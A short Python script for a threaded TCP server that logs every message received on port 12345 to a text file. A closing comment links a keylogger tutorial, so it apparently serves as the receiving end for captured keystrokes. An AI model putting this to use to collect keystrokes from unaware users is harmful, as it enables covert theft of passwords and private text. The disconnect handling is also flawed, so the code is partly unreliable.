#coding:utf-8
import socket
import threading

def save(data):
    with open("log.txt", "a") as file:
        file.write(data)
        file.close()

def instanceServeur(client, infosClient):
    adresseIP = infosClient[0]
    port = str(infosClient[1])
    print("Server instance ready for", adresseIP, ":", port)

    message = ""
    while True:
        message = client.recv(1024)
        message = message.decode("utf8")
        if message == "":
            pass
        else:
            print(f'➜ {message}')
            save(f'{message}\n')
        if message.upper() == "STOPIT":
            print("Closing the client's socket.")
            client.close()
            break
    
    print("Closing the client's socket.")
    client.close()

threadsClients = []
adresse = ''
port = 12345
socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

socket.bind((adresse, port))
print("The server is listenning on port: ", port)

while True:
    socket.listen()

    client, infosClient = socket.accept()
    threadsClients.append(threading.Thread(None, instanceServeur, None, (client, infosClient), {}))
    threadsClients[-1].start()
    

socket.close()

#https://medium.com/analytics-vidhya/python-keylogger-tutorial-ef178d02f24a

